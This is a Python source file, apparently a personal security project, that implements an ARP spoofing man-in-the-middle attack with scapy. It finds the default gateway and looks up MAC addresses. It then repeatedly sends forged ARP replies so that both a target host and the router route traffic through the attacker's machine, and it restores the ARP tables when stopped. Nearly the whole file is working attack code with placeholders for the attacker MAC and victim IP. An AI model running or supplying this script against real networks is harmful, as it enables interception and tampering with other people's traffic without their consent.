###################### ARP SPOOFING ####################

# More in README.md
# Author: Anthony KOUROGHLI (anthkrg)

################### IMPORT WHAT WE NEED ###################

import os
import time
import platform
from scapy.all import *

# ------------------------ GET GATEWAY IP ---------------------------
def get_gateway():
    """Retrieves the default gateway IP based on the operating system."""
    system_os = platform.system()

    if system_os == "Windows":
        result = os.popen("ipconfig").read()
        for line in result.split("\n"):
            if "Default Gateway" in line or "Passerelle par défaut" in line:
                return line.split(":")[-1].strip()
    else:  # Linux/MacOS
        result = os.popen("ip route | grep default").read()
        if result:
            return result.split()[2]
    
    return None


# ----------------------- GET MAC ADDRESS --------------------------
def get_mac(ip):
    """Retrieves the MAC address of an IP using an ARP request."""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    return None


# ---------------------- ARP SPOOFING -------------------------------
def arp_spoof(target_ip, spoof_ip, attacker_mac):
    """Sends an ARP spoofing packet to trick a device into thinking we are another device."""
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] Unable to get MAC address for {target_ip}")
        return

    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    sendp(packet, verbose=False)


# ----------------------- RESTORE ARP TABLE ---------------------------
def restore_arp(target_ip, spoof_ip):
    """Restores the ARP table by sending correct MAC addresses."""
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)

    if target_mac and spoof_mac:
        packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
        sendp(packet, count=4, verbose=False)  # Send multiple packets to ensure correction


# ---------------------- MAIN SCRIPT -------------------------------

ATTACKER_MAC = "08:00:27:76:f3:53" # CHANGEME
TARGET_IP = "192.168.1.37" # CHANGEME
GATEWAY_IP = get_gateway()

if GATEWAY_IP:
    print(f"[*] Gateway detected: {GATEWAY_IP}")
else:
    print("[!!!] Error: Unable to retrieve gateway IP.")
    exit()

try:
    print("[*] Starting ARP spoofing attack...")
    while True:
        arp_spoof(TARGET_IP, GATEWAY_IP, ATTACKER_MAC)  # Make the victim believe we are the router
        arp_spoof(GATEWAY_IP, TARGET_IP, ATTACKER_MAC)  # Make the router believe we are the victim
        time.sleep(0.1)
except KeyboardInterrupt:
    print("\n[!] Stopping attack. Restoring ARP tables...")
    restore_arp(TARGET_IP, GATEWAY_IP)
    restore_arp(GATEWAY_IP, TARGET_IP)
    print("[*] ARP tables restored.")
